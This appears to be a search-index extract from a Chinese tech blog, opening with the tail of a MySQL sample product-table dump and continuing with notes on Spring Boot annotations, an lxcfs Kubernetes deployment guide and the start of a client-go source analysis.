\u0026#39;2902\u0026#39;, \u0026#39;26.30\u0026#39;, \u0026#39;65.75\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3432\u0026#39;, \u0026#39;2002 Chevy Corvette\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;The operating parts of this limited edition Diecast 2002 Chevy Corvette 50th Anniversary Pace car Limited Edition are particularly delicate due to their precise scale and require special care and attention. Features rotating wheels, poseable streering, opening doors and trunk.\u0026#39;, \u0026#39;9446\u0026#39;, \u0026#39;62.11\u0026#39;, \u0026#39;107.08\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3816\u0026#39;, \u0026#39;1940 Ford Delivery Sedan\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;Chrome Trim, Chrome Grille, Opening Hood, Opening Doors, Opening Trunk, Detailed Engine, Working Steering System. Color black.\u0026#39;, \u0026#39;6621\u0026#39;, \u0026#39;48.64\u0026#39;, \u0026#39;83.86\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3856\u0026#39;, \u0026#39;1956 Porsche 356A Coupe\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Features include: Turnable front wheels; steering function; detailed interior; detailed engine; opening hood; opening trunk; opening doors; and detailed chassis.\u0026#39;, \u0026#39;6600\u0026#39;, \u0026#39;98.30\u0026#39;, \u0026#39;140.43\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3949\u0026#39;, \u0026#39;Corsair F4U ( Bird Cage)\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Has retractable wheels and comes with a stand. Official logos and insignias.\u0026#39;, \u0026#39;6812\u0026#39;, \u0026#39;29.34\u0026#39;, \u0026#39;68.24\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_3969\u0026#39;, \u0026#39;1936 Mercedes Benz 500k Roadster\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;This model features grille-mounted chrome horn, lift-up louvered hood, fold-down rumble seat, working steering system and rubber wheels. Color black.\u0026#39;, \u0026#39;2081\u0026#39;, \u0026#39;21.75\u0026#39;, \u0026#39;41.03\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_4048\u0026#39;, \u0026#39;1992 Porsche Cayenne Turbo Silver\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;This replica features opening doors, superb detail and craftsmanship, working steering system, opening forward compartment, opening rear trunk with removable spare, 4 wheel independent spring suspension as well as factory baked enamel finish.\u0026#39;, \u0026#39;6582\u0026#39;, \u0026#39;69.78\u0026#39;, \u0026#39;118.28\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_4258\u0026#39;, \u0026#39;1936 Chrysler Airflow\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Features opening trunk, working steering system. Color dark green.\u0026#39;, \u0026#39;4710\u0026#39;, \u0026#39;57.46\u0026#39;, \u0026#39;97.39\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_4278\u0026#39;, \u0026#39;1900s Vintage Tri-Plane\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:24\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Hand crafted diecast-like metal Triplane is Re-created in about 1:24 scale of antique pioneer airplane. This antique style metal triplane is all hand-assembled with many different parts.\u0026#39;, \u0026#39;2756\u0026#39;, \u0026#39;36.23\u0026#39;, \u0026#39;72.45\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S24_4620\u0026#39;, \u0026#39;1961 Chevrolet Impala\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;This 1:18 scale precision die-cast reproduction of the 1961 Chevrolet Impala has all the features-doors, hood and trunk that open; detailed 409 cubic-inch engine; chrome dashboard and stick shift, two-tone interior; working steering system; all topped of with a factory baked-enamel finish.\u0026#39;, \u0026#39;7869\u0026#39;, \u0026#39;32.33\u0026#39;, \u0026#39;80.84\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_1268\u0026#39;, \u0026#39;1980鈥檚 GM Manhattan Express\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;This 1980鈥檚 era new look Manhattan express is still active, running from the Bronx to mid-town Manhattan. Has 35 opeining windows and working lights. Needs a battery.\u0026#39;, \u0026#39;5099\u0026#39;, \u0026#39;53.93\u0026#39;, \u0026#39;96.31\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_1374\u0026#39;, \u0026#39;1997 BMW F650 ST\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Exoto Designs\u0026#39;, \u0026#39;Features official die-struck logos and baked enamel finish. Comes with stand.\u0026#39;, \u0026#39;178\u0026#39;, \u0026#39;66.92\u0026#39;, \u0026#39;99.89\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_2206\u0026#39;, \u0026#39;1982 Ducati 996 R\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;Features rotating wheels , working kick stand. Comes with stand.\u0026#39;, \u0026#39;9241\u0026#39;, \u0026#39;24.14\u0026#39;, \u0026#39;40.23\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_2509\u0026#39;, \u0026#39;1954 Greyhound Scenicruiser\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;Model features bi-level seating, 50 windows, skylights \u0026amp; glare resistant glass, working steering system, original logos\u0026#39;, \u0026#39;2874\u0026#39;, \u0026#39;25.98\u0026#39;, \u0026#39;54.11\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_3207\u0026#39;, \u0026#39;1950\\\u0026#39;s Chicago Surface Lines Streetcar\u0026#39;, \u0026#39;Trains\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Gearbox Collectibles\u0026#39;, \u0026#39;This streetcar is a joy to see. It has 80 separate windows, electric wire guides, detailed interiors with seats, poles and drivers controls, rolling and turning wheel assemblies, plus authentic factory baked-enamel finishes (Green Hornet for Chicago and Cream and Crimson for Boston).\u0026#39;, \u0026#39;8601\u0026#39;, \u0026#39;26.72\u0026#39;, \u0026#39;62.14\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_3522\u0026#39;, \u0026#39;1996 Peterbilt 379 Stake Bed with Outrigger\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;This model features, opening doors, detailed engine, working steering, tinted windows, detailed interior, die-struck logos, removable stakes operating outriggers, detachable second trailer, functioning 360-degree self loader, precision molded resin trailer and trim, baked enamel finish on cab\u0026#39;, \u0026#39;814\u0026#39;, \u0026#39;33.61\u0026#39;, \u0026#39;64.64\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_4289\u0026#39;, \u0026#39;1928 Ford Phaeton Deluxe\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;This model features grille-mounted chrome horn, lift-up louvered hood, fold-down rumble seat, working steering system\u0026#39;, \u0026#39;136\u0026#39;, \u0026#39;33.02\u0026#39;, \u0026#39;68.79\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S32_4485\u0026#39;, \u0026#39;1974 Ducati 350 Mk3 Desmo\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:32\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;This model features two-tone paint with chrome accents, superior die-cast detail , rotating wheels , working kick stand\u0026#39;, \u0026#39;3341\u0026#39;, \u0026#39;56.13\u0026#39;, \u0026#39;102.05\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S50_1341\u0026#39;, \u0026#39;1930 Buick Marquette Phaeton\u0026#39;, \u0026#39;Vintage Cars\u0026#39;, \u0026#39;1:50\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;Features opening trunk, working steering system\u0026#39;, \u0026#39;7062\u0026#39;, \u0026#39;27.06\u0026#39;, \u0026#39;43.64\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S50_1392\u0026#39;, \u0026#39;Diamond T620 Semi-Skirted Tanker\u0026#39;, \u0026#39;Trucks and Buses\u0026#39;, \u0026#39;1:50\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;This limited edition model is licensed and perfectly scaled for Lionel Trains. The Diamond T620 has been produced in solid precision diecast and painted with a fire baked enamel finish. It comes with a removable tanker and is a perfect model to add authenticity to your static train or car layout or to just have on display.\u0026#39;, \u0026#39;1016\u0026#39;, \u0026#39;68.29\u0026#39;, \u0026#39;115.75\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S50_1514\u0026#39;, \u0026#39;1962 City of Detroit Streetcar\u0026#39;, \u0026#39;Trains\u0026#39;, \u0026#39;1:50\u0026#39;, \u0026#39;Classic Metal Creations\u0026#39;, \u0026#39;This streetcar is a joy to see. It has 99 separate windows, electric wire guides, detailed interiors with seats, poles and drivers controls, rolling and turning wheel assemblies, plus authentic factory baked-enamel finishes (Green Hornet for Chicago and Cream and Crimson for Boston).\u0026#39;, \u0026#39;1645\u0026#39;, \u0026#39;37.49\u0026#39;, \u0026#39;58.58\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S50_4713\u0026#39;, \u0026#39;2002 Yamaha YZR M1\u0026#39;, \u0026#39;Motorcycles\u0026#39;, \u0026#39;1:50\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;Features rotating wheels , working kick stand. Comes with stand.\u0026#39;, \u0026#39;600\u0026#39;, \u0026#39;34.17\u0026#39;, \u0026#39;81.36\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_1138\u0026#39;, \u0026#39;The Schooner Bluenose\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Autoart Studio Design\u0026#39;, \u0026#39;All wood with canvas sails. Measures 31 1/2 inches in Length, 22 inches High and 4 3/4 inches Wide. Many extras.\\r\\nThe schooner Bluenose was built in Nova Scotia in 1921 to fish the rough waters off the coast of Newfoundland. Because of the Bluenose racing prowess she became the pride of all Canadians. Still featured on stamps and the Canadian dime, the Bluenose was lost off Haiti in 1946.\u0026#39;, \u0026#39;1897\u0026#39;, \u0026#39;34.00\u0026#39;, \u0026#39;66.67\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_1691\u0026#39;, \u0026#39;American Airlines: B767-300\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Min Lin Diecast\u0026#39;, \u0026#39;Exact replia with official logos and insignias and retractable wheels\u0026#39;, \u0026#39;5841\u0026#39;, \u0026#39;51.15\u0026#39;, \u0026#39;91.34\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_1938\u0026#39;, \u0026#39;The Mayflower\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Studio M Art Models\u0026#39;, \u0026#39;Measures 31 1/2 inches Long x 25 1/2 inches High x 10 5/8 inches Wide\\r\\nAll wood with canvas sail. Extras include long boats, rigging, ladders, railing, anchors, side cannons, hand painted, etc.\u0026#39;, \u0026#39;737\u0026#39;, \u0026#39;43.30\u0026#39;, \u0026#39;86.61\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_2047\u0026#39;, \u0026#39;HMS Bounty\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Measures 30 inches Long x 27 1/2 inches High x 4 3/4 inches Wide. \\r\\nMany extras including rigging, long boats, pilot house, anchors, etc. Comes with three masts, all square-rigged.\u0026#39;, \u0026#39;3501\u0026#39;, \u0026#39;39.83\u0026#39;, \u0026#39;90.52\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_2466\u0026#39;, \u0026#39;America West Airlines B757-200\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;Official logos and insignias. Working steering system. Rotating jet engines\u0026#39;, \u0026#39;9653\u0026#39;, \u0026#39;68.80\u0026#39;, \u0026#39;99.72\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_2610\u0026#39;, \u0026#39;The USS Constitution Ship\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Red Start Diecast\u0026#39;, \u0026#39;All wood with canvas sails. Measures 31 1/2\\\u0026#34; Length x 22 3/8\\\u0026#34; High x 8 1/4\\\u0026#34; Width. Extras include 4 boats on deck, sea sprite on bow, anchors, copper railing, pilot houses, etc.\u0026#39;, \u0026#39;7083\u0026#39;, \u0026#39;33.97\u0026#39;, \u0026#39;72.28\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_2824\u0026#39;, \u0026#39;1982 Camaro Z28\u0026#39;, \u0026#39;Classic Cars\u0026#39;, \u0026#39;1:18\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;Features include opening and closing doors. Color: White. \\r\\nMeasures approximately 9 1/2\\\u0026#34; Long.\u0026#39;, \u0026#39;6934\u0026#39;, \u0026#39;46.53\u0026#39;, \u0026#39;101.15\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_2834\u0026#39;, \u0026#39;ATA: B757-300\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Highway 66 Mini Classics\u0026#39;, \u0026#39;Exact replia with official logos and insignias and retractable wheels\u0026#39;, \u0026#39;7106\u0026#39;, \u0026#39;59.33\u0026#39;, \u0026#39;118.65\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_3167\u0026#39;, \u0026#39;F/A 18 Hornet 1/72\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:72\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;10\\\u0026#34; Wingspan with retractable landing gears.Comes with pilot\u0026#39;, \u0026#39;551\u0026#39;, \u0026#39;54.40\u0026#39;, \u0026#39;80.00\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_3505\u0026#39;, \u0026#39;The Titanic\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Carousel DieCast Legends\u0026#39;, \u0026#39;Completed model measures 19 1/2 inches long, 9 inches high, 3inches wide and is in barn red/black. All wood and metal.\u0026#39;, \u0026#39;1956\u0026#39;, \u0026#39;51.09\u0026#39;, \u0026#39;100.17\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_3962\u0026#39;, \u0026#39;The Queen Mary\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Welly Diecast Productions\u0026#39;, \u0026#39;Exact replica. Wood and Metal. Many extras including rigging, long boats, pilot house, anchors, etc. Comes with three masts, all square-rigged.\u0026#39;, \u0026#39;5088\u0026#39;, \u0026#39;53.63\u0026#39;, \u0026#39;99.31\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S700_4002\u0026#39;, \u0026#39;American Airlines: MD-11S\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:700\u0026#39;, \u0026#39;Second Gear Diecast\u0026#39;, \u0026#39;Polished finish. Exact replia with official logos and insignias and retractable wheels\u0026#39;, \u0026#39;8820\u0026#39;, \u0026#39;36.27\u0026#39;, \u0026#39;74.03\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S72_1253\u0026#39;, \u0026#39;Boeing X-32A JSF\u0026#39;, \u0026#39;Planes\u0026#39;, \u0026#39;1:72\u0026#39;, \u0026#39;Motor City Art Classics\u0026#39;, \u0026#39;10\\\u0026#34; Wingspan with retractable landing gears.Comes with pilot\u0026#39;, \u0026#39;4857\u0026#39;, \u0026#39;32.77\u0026#39;, \u0026#39;49.66\u0026#39;); INSERT INTO `products` VALUES (\u0026#39;S72_3212\u0026#39;, \u0026#39;Pont Yacht\u0026#39;, \u0026#39;Ships\u0026#39;, \u0026#39;1:72\u0026#39;, \u0026#39;Unimax Art Galleries\u0026#39;, \u0026#39;Measures 38 inches Long x 33 3/4 inches High. Includes a stand.\\r\\nMany extras including rigging, long boats, pilot house, anchors, etc. Comes with 2 masts, all square-rigged\u0026#39;, \u0026#39;414\u0026#39;, \u0026#39;33.30\u0026#39;, \u0026#39;54.60\u0026#39;); -- ---------------------------- -- Table structure for `tokens` -- ---------------------------- DROP TABLE IF EXISTS `tokens`; CREATE TABLE `tokens` ( `s` varchar(6) DEFAULT NULL ) ENGINE=InnoDB DEFAULT CHARSET=utf8; -- ---------------------------- -- Records of tokens -- ---------------------------- INSERT INTO `tokens` VALUES (\u0026#39;abcdef\u0026#39;);   ","permalink":"http://bingerambo.com/posts/2021/10/windows%E5%AE%89%E8%A3%85mysql/","tags":["MySQL"],"title":"Windows安装MySQL"},{"categories":["Java"],"contents":"一些SpringBoot注解说明的学习笔记\n一、注解详解（配备了完善的释义） @SpringBootApplication：申明让spring boot自动给程序进行必要的配置，这个配置等同于：\n@Configuration ，@EnableAutoConfiguration 和 @ComponentScan 三个配置。\n@ResponseBody：表示该方法的返回结果直接写入HTTP response body中，一般在异步获取数据时使用，用于构建RESTful的api。在使用@RequestMapping后，返回值通常解析为跳转路径，加上@esponsebody后返回结果不会被解析为跳转路径，而是直接写入HTTP response body中。比如异步获取json数据，加上@Responsebody后，会直接返回json数据。该注解一般会配合@RequestMapping一起使用。\n@Controller：用于定义控制器类，在spring项目中由控制器负责将用户发来的URL请求转发到对应的服务接口（service层），一般这个注解在类中，通常方法需要配合注解@RequestMapping。\n@RestController：用于标注控制层组件(如struts中的action)，@ResponseBody和@Controller的合集。\n@RequestMapping：提供路由信息，负责URL到Controller中的具体函数的映射。\n@EnableAutoConfiguration：SpringBoot自动配置（auto-configuration）：尝试根据你添加的jar依赖自动配置你的Spring应用。例如，如果你的classpath下存在HSQLDB，并且你没有手动配置任何数据库连接beans，那么我们将自动配置一个内存型（in-memory）数据库”。你可以将@EnableAutoConfiguration或者@SpringBootApplication注解添加到一个@Configuration类上来选择自动配置。如果发现应用了你不想要的特定自动配置类，你可以使用@EnableAutoConfiguration注解的排除属性来禁用它们。\n@ComponentScan：表示将该类自动发现扫描组件。个人理解相当于，如果扫描到有@Component、@Controller、@Service等这些注解的类，并注册为Bean，可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。可以自动收集所有的Spring组件，包括@Configuration类。我们经常使用@ComponentScan注解搜索beans，并结合@Autowired注解导入。如果没有配置的话，Spring Boot会扫描启动类所在包下以及子包下的使用了@Service,@Repository等注解的类。\n@Configuration：相当于传统的xml配置文件，如果有些第三方库需要用到xml文件，建议仍然通过@Configuration类作为项目的配置主类——可以使用@ImportResource注解加载xml配置文件。\n@Import：用来导入其他配置类。\n@ImportResource：用来加载xml配置文件。\n@Autowired：自动导入依赖的bean\n@Service：一般用于修饰service层的组件\n@Repository：使用@Repository注解可以确保DAO或者repositories提供异常转译，这个注解修饰的DAO或者repositories类会被ComponetScan发现并配置，同时也不需要为它们提供XML配置项。\n@Bean：用@Bean标注方法等价于XML中配置的bean。\n@Value：注入Spring boot application.properties配置的属性的值。示例代码：\n@Inject：等价于默认的@Autowired，只是没有required属性；\n@Component：泛指组件，当组件不好归类的时候，我们可以使用这个注解进行标注。\n@Bean:相当于XML中的,放在方法的上面，而不是类，意思是产生一个bean,并交给spring管理。\n@AutoWired：自动导入依赖的bean。byType方式。把配置好的Bean拿来用，完成属性、方法的组装，它可以对类成员变量、方法及构造函数进行标注，完成自动装配的工作。当加上（required=false）时，就算找不到bean也不报错。\n@Qualifier：当有多个同一类型的Bean时，可以用@Qualifier(“name”)来指定。与@Autowired配合使用。@Qualifier限定描述符除了能根据名字进行注入，但能进行更细粒度的控制如何选择候选者，具体使用方式如下：\n@Resource(name=”name”,type=”type”)：没有括号内内容的话，默认byName。与@Autowired干类似的事。\n二、注解列表如下 @SpringBootApplication：包含了@ComponentScan、@Configuration和@EnableAutoConfiguration注解。其中\n@ComponentScan：让spring Boot扫描到Configuration类并把它加入到程序上下文。\n@Configuration ：等同于spring的XML配置文件；使用Java代码可以检查类型安全。\n@EnableAutoConfiguration ：自动配置。\n@ComponentScan ：组件扫描，可自动发现和装配一些Bean。\n@Component可配合CommandLineRunner使用，在程序启动后执行一些基础任务。\n@RestController：注解是@Controller和@ResponseBody的合集,表示这是个控制器bean,并且是将函数的返回值直 接填入HTTP响应体中,是REST风格的控制器。\n@Autowired：自动导入。\n@PathVariable：获取参数。\n@JsonBackReference：解决嵌套外链问题。\n@RepositoryRestResourcepublic：配合spring-boot-starter-data-rest使用。\n三、JPA注解 @Entity：@Table(name=”“)：表明这是一个实体类。一般用于jpa这两个注解一般一块使用，但是如果表名和实体类名相同的话，@Table可以省略\n@MappedSuperClass:用在确定是父类的entity上。父类的属性子类可以继承。\n@NoRepositoryBean:一般用作父类的repository，有这个注解，spring不会去实例化该repository。\n@Column：如果字段名与列名相同，则可以省略。\n@Id：表示该属性为主键。\n@GeneratedValue(strategy = GenerationType.SEQUENCE,generator = “repair_seq”)：表示主键生成策略是sequence（可以为Auto、IDENTITY、native等，Auto表示可在多个数据库间切换），指定sequence的名字是repair_seq。\n@SequenceGeneretor(name = “repair_seq”, sequenceName = “seq_repair”, allocationSize = 1)：name为sequence的名称，以便使用，sequenceName为数据库的sequence名称，两个名称可以一致。\n@Transient：表示该属性并非一个到数据库表的字段的映射,ORM框架将忽略该属性。如果一个属性并非数据库表的字段映射,就务必将其标示为@Transient,否则,ORM框架默认其注解为@Basic。@Basic(fetch=FetchType.LAZY)：标记可以指定实体属性的加载方式\n@JsonIgnore：作用是json序列化时将Java bean中的一些属性忽略掉,序列化和反序列化都受影响。\n@JoinColumn（name=”loginId”）:一对一：本表中指向另一个表的外键。一对多：另一个表指向本表的外键。\n@OneToOne、@OneToMany、@ManyToOne：对应hibernate配置文件中的一对一，一对多，多对一。\n四、springMVC相关注解 @RequestMapping：@RequestMapping(“/path”)表示该控制器处理所有“/path”的UR L请求。RequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。 用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。该注解有六个属性： params:指定request中必须包含某些参数值是，才让该方法处理。 headers:指定request中必须包含某些指定的header值，才能让该方法处理请求。 value:指定请求的实际地址，指定的地址可以是URI Template 模式 method:指定请求的method类型， GET、POST、PUT、DELETE等 consumes:指定处理请求的提交内容类型（Content-Type），如application/json,text/html; produces:指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回\n@RequestParam：用在方法的参数前面。 @RequestParam String a =request.getParameter(“a”)。\n@PathVariable:路径变量。如\n参数与大括号里的名字一样要相同。\n五、全局异常处理 @ControllerAdvice：包含@Component。可以被扫描到。统一处理异常。\n@ExceptionHandler（Exception.class）：用在方法上面表示遇到这个异常就执行以下方法。\n六、附录 使用Annotation配合自动扫描能大幅简化Spring的配置，我们只需要保证：\n每个Bean被标注为@Component并正确使用@Autowired注入； 配置类被标注为@Configuration和@ComponentScan； 所有Bean均在指定包以及子包内\n@Component和@Bean和@Autowired之间的区别 https://blog.csdn.net/CW_SZDX/article/details/106868298\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  @Component是 spring 2.5引入的，为了摆脱通过classpath扫描根据xml方式定义的bean的方式. @Bean是spring 3.0 引入的，和 @Configuration一起工作，为了摆脱原先的xml和java config方式。 Spring管理Bean方式有两种，一种是注册Bean，一种装配Bean。 可以通过三种方式实现bean管理，一使用自动配置的方式、二使用JavaConfig的方式、三使用XML配置的方式。 @Compoent 作用就相当于 XML配置 @Component（@Controller、@Service、@Repository）:自动创建一个实例并装配到Spring容器中(放到IOC中) @Bean :手动创建一个实例，并保留在IOC中。 @Bean的好处：麻烦一点，但自定义性更强。当我们引用第三方库中的类需要装配到Spring容器时，则只能通过@Bean来实现~（因为你并不能改他的源代码在他类上加个@Component ，所以只能这么玩了。 @Autowired:织入（Spring上下文已有实例（已注入IOC），@Autowired只是取一下） @Autowired说“请给我一个该类的实例，例如，我之前用@Bean注释创建的一个实例进入IOC了”。   Spring的Java配置方式—@Configuration和@Bean实现Java配置 https://www.cnblogs.com/linjiqin/p/9655649.html\n@Component、@Repository 、@Service、@Controller的区别与联系\nhttps://www.cnblogs.com/jiazhutao/p/12206448.html\n@Component, @Repository, @Service，@Controller的区别:\n1 2 3 4 5 6  @Component, @Service, @Controller, @Repository是spring注解，注解后可以被spring框架所扫描并注入到spring容器来进行管理 @Component是通用注解，其他三个注解是这个注解的拓展，并且具有了特定的功能 @Repository注解在持久层中，具有将数据库操作抛出的原生异常翻译转化为spring的持久层异常的功能。 @Controller层是spring-mvc的注解，具有将请求进行转发，重定向的功能。 @Service层是业务逻辑层注解，这个注解只是标注该类处于业务逻辑层。 用这些注解对应用进行分层之后，就能将请求处理，义务逻辑处理，数据库操作处理分离出来，为代码解耦，也方便了以后项目的维护和开发。   Spring 注释 @Autowired 和@Resource 的区别\n@Autowired和@Resource都可以用来装配bean，都可以写在字段上，或者方法上。\n@Autowired属于Spring的；@Resource为JSR-250标准的注释，属于J2EE的。\n@Bean、@Component、 @Service、 @Repository 和 @Controller注解的区别\nhttps://blog.csdn.net/russle/article/details/83247163\n1 2 3 4 5  @Bean：表示一个方法实例化、配置或者初始化一个Spring IoC容器管理的新对象。 @Component: 自动被comonent扫描。 表示被注解的类会自动被component扫描 @Repository: 用于持久层，主要是数据库存储库。 @Service: 表示被注解的类是位于业务层的业务component。 @Controller:表明被注解的类是控制component，主要用于展现层 。   ","permalink":"http://bingerambo.com/posts/2021/10/springboot%E6%B3%A8%E8%A7%A3%E8%AF%B4%E6%98%8E/","tags":["Java"],"title":"SpringBoot注解说明"},{"categories":["K8S"],"contents":"本文通过lxcfs的k8s部署方式，实现容器资源隔离视图；并通过k8s参数设置了容器的shm大小\n说明 实现容器资源隔离视图，即为容器分配cpu和内存大小，在容器内部看到的是容器资源配额，而不是宿主机全部计算资源\n采用lxcfs实现容器资源隔离，并通过k8s容器化方式部署完成\nlxcfs-webhook项目 我的lxcfs-webhook项目，点这里进入\nhttps://github.com/bingerambo/lxcfs-admission-webhook\n本项目针对lxscfs的k8s部署问题重新做了修改：\n custom-lxcfs-image： 重新制作了镜像 deployment： 修改了部署lxcfs配置yaml lxcfs.go： 对应lxcfs配置，修改了webhook代码   lxcfs部署准备文件  2个镜像文件分别是lxcfs和webhook，可根据我的lxcfs项目进行制作 2个so文件是lxcfs程序需用，部署时安装 Deployment文件夹下是部署配置脚本  配置 修改配置如下\n红色标记为要修改处，根据实际情况修改\nlxcfs-daemonset.yaml deployment.yaml 部署 部署命令 /tmp/为要修改处，根据实际情况修改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  # Deploy ## Copy lxcfs libs deployment/process_lib.sh ## Copy lxcfs remount.sh cp deployment/container_remount_lxcfs.sh /tmp/ ## Deploy lxcfs to worker nodes kubectl apply -f deployment/lxcfs-daemonset.yaml ## Install injector with lxcfs-admission-webhook deployment/install.sh kubectl apply -f deployment/deployment.yaml   业务测试 namespace: test-lxcfs为要修改处，根据实际情况修改\n1 2 3 4 5 6 7 8 9 10  # Test ## Enable the namespace for injection kubectl create namespace test-lxcfs kubectl label namespace test-lxcfs lxcfs-admission-webhook=enabled ## Deploy the test deployment kubectl apply -f deployment/web.yaml   共享内存 对于k8s1.20+版本支持共享内存容器视图\n通过设置kubelet的feature-gates参数实现\n1  --feature-gates=\u0026#34;SizeMemoryBackedVolumes=true\u0026#34;  容器资源隔离视图 经过lxcfs部署安装和共享内存配置后，发现容器资源\n cpu mem shm  都实现了资源视图隔离\n","permalink":"http://bingerambo.com/posts/2021/10/lxcfs%E7%9A%84k8s%E9%83%A8%E7%BD%B2%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0%E5%AE%B9%E5%99%A8%E8%B5%84%E6%BA%90%E9%9A%94%E7%A6%BB%E8%A7%86%E5%9B%BE/","tags":["K8S"],"title":"lxcfs的k8s部署方式，实现容器资源隔离视图"},{"categories":["K8S"],"contents":"K8S go-client 源码分析，k8s controller开发所需\n本文参考了CSDN博主「进德」的原创文章，原文链接：https://blog.csdn.net/weixin_42663840/article/details/81699303, 并做了部分内容和注释说明修改：\nClient-go client-go 设计\n可以看到client-go主要模块有：\n client  restclient clientset dynamicclient discoveryclient   informer  reflactor deltafifo indexer   workqueue  说明：client和workqueue源码分析不在本文中介绍。\n设计图 由上可看出，进行k8s 